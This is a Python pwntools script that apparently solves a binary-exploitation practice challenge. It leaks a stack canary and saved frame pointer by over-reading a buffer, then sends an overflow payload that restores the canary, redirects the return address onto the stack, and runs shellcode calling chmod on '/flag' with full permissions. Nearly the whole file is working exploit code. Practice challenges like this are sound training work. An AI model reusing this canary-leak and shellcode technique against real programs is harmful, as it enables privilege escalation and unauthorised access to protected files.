from pwn import *

p = process("/challenge/toddlerone_level6.1")

"""
rsp = int(input("Rsp = "))
rbp = int(input("RBP = "))
ret = rbp+0x8
canary = rbp-int(input("offset = "))
"""


"""   STACK @input
0x7ffcc1f0a4c0:	0x0000000000000000	0x0000000000000000
0x7ffcc1f0a4d0:	0x0000000000000000	0x0000000000000000
0x7ffcc1f0a4e0:	0x0000000000000000	0x0000000000000000
0x7ffcc1f0a4f0:	0x0000000100000000	0x00007ffc000000e7
0x7ffcc1f0a500:	0x0000563ee2acd220	0xcb7eece8be61de00
0x7ffcc1f0a510:	0x00007ffcc1f0b550	0x0000563ee2acd71c
"""

rsp = 0x7ffcc1f0a470
rbp = 0x7ffcc1f0a510
ret = 0x7ffcc1f0a518
canary = 0x7ffcc1f0a508
in_addr = 0x7ffcc1f0a4c0


before_ret = ret - in_addr
before_canary = (canary - in_addr)
print("before canary : ", before_canary)
print("before ret : ", before_ret)
p.readuntil(b'Payload size: ')
canary_payload = b'73 REPEATaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawxyz'
print("canary payload = ", canary_payload)
print("canary payload length = ", len(canary_payload))
p.send(canary_payload)
p.readuntil(b'wxyz')
print("here")
x = p.readuntil(b'Backdoor')
Canary = b'\x00' + x[:7]
xcanary = b'A' + x[:7]
print("canary = ", Canary)
p.readuntil(b'Payload size: ')


p.send(b'10 REPEATaaaa')
p.readuntil(b'Payload size: ')

prev_rbp_payload = b'80 REPEAT' + b'z'*73 + b'x'

print("Previous rbp payload = ", prev_rbp_payload)
print("previous rbp payload length = ", len(prev_rbp_payload))
p.send(prev_rbp_payload)
p.readuntil(b'zx')
x = p.readuntil(b'\n')
x = x[:6]

prev_rbp = int.from_bytes(x, 'little')
print("Previous rbp = ", hex(prev_rbp))
print(x)


p.readuntil(b'Payload size: ')
ret_addr = prev_rbp-0x150
ret = ret_addr.to_bytes(8, 'little')
print("Return address = ", hex(ret_addr))


context.arch = 'amd64'
assem = """
	mov rax, 90
    lea rdi, [rip + file]
    mov rsi, 0x1ff
	syscall
file:
	.string "/flag"
"""
shellcode = asm(assem)
print("shellcode length = ", len(shellcode))

final_payload = b'173 ' + b'a'*52 + \
    b'Z\x00\x00\x00\x01\x00\x00\x00aaaaaaaaaaaa' + \
    Canary + b'a'*0x8 + ret + shellcode
print("payload length = ", len(final_payload))
p.send(final_payload)
# p.readuntil(b'Goodbye!\n')
print(p.readall())
